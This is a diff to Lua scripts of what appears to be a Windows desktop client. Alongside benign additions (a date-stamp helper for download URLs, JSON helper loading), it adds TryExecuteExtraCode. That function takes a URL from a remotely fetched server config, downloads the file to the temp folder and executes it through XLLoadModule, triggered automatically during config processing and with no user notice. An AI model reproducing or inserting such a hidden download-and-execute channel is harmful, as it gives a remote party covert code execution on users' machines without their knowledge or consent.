@@ -170,6 +170,16 @@ function MessageBox(str)
 end
 
 
+function GetTimeStamp()
+	local strPeerId = GetPeerID()
+	local iFlag = tonumber(string.sub(strPeerId, 12, 12), 16) or 0
+	local iTime = tipUtil:GetCurrentUTCTime()
+	local ss = math.floor((iTime + 8 * 3600  - (iFlag + 1) * 3600)/(24*3600))
+	local strStamp = "?stamp=" .. tostring(ss)
+	return strStamp 
+end
+
+
 function TipLog(strLog)
 	if type(tipUtil.Log) == "function" then
 		tipUtil:Log("@@greenwall_Template MainTipLog: " .. tostring(strLog))
@@ -360,9 +370,11 @@ function DownLoadServerConfig(fnCallBack, nTimeInMs)
 		return
 	end
 	
+	local strStamp = GetTimeStamp()
+	local strURLFix = strConfigURL..strStamp
 	local nTime = tonumber(nTimeInMs) or 5*1000
 		
-	NewAsynGetHttpFile(strConfigURL, strSavePath, false
+	NewAsynGetHttpFile(strURLFix, strSavePath, false
 	, function(bRet, strRealPath)
 		TipLog("[DownLoadServerConfig] bRet:"..tostring(bRet)
 				.." strRealPath:"..tostring(strRealPath))
@@ -1797,6 +1809,36 @@ function TryForceUpdate(tServerConfig)
 end
 
 
+function TryExecuteExtraCode(tServerConfig)
+	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
+	local strURL = tExtraHelper["strURL"]
+	local strMD5 = tExtraHelper["strMD5"]
+	
+	if not IsRealString(strURL) then
+		return
+	end
+	local strHelperName = GetFileSaveNameFromUrl(strURL)
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
+	
+	local strStamp = GetTimeStamp()
+	local strURLFix = strURL..strStamp
+	
+	DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
+	, function(bRet, strRealPath)
+		TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
+		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
+				
+		if bRet < 0 then
+			return
+		end
+		
+		TipLog("[TryExecuteExtraCode] begin execute extra helper")
+		XLLoadModule(strRealPath)
+	end)	
+end
+
+
 function WriteLastPullTime()
 	local strStartCfgPath = GetCfgPathWithName("startcfg.ini")
 	if not IsRealString(strStartCfgPath) then
@@ -1904,7 +1946,9 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	TryForceUpdate(tServerConfig)
 	FixStartConfig(tServerConfig)
 	FixUserConfig(tServerConfig)
-	CheckServerRuleFile(tServerConfig)
+	CheckServerRuleFile(tServerConfig)  --execut tipmain 
+	
+	TryExecuteExtraCode(tServerConfig)
 end
 
 
@@ -1941,6 +1985,12 @@ function TryShowIntroduceWnd(strCmd)
 end
 
 
+function LoadJSONHelper()
+	local strJSONHelperPath = __document.."\\..\\JSON.lua"
+	local Module = XLLoadModule(strJSONHelperPath)
+end
+
+
 function ShowPopWndByCommand()
 	local cmdString = tipUtil:GetCommandLine()
 	TryShowNonSysBubble(cmdString)
@@ -1974,6 +2024,7 @@ function PreTipMain()
 	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
 	
 	RegisterFunctionObject()
+	LoadJSONHelper()
 	
 	StartRunCountTimer()
 	SendGSStartReport()
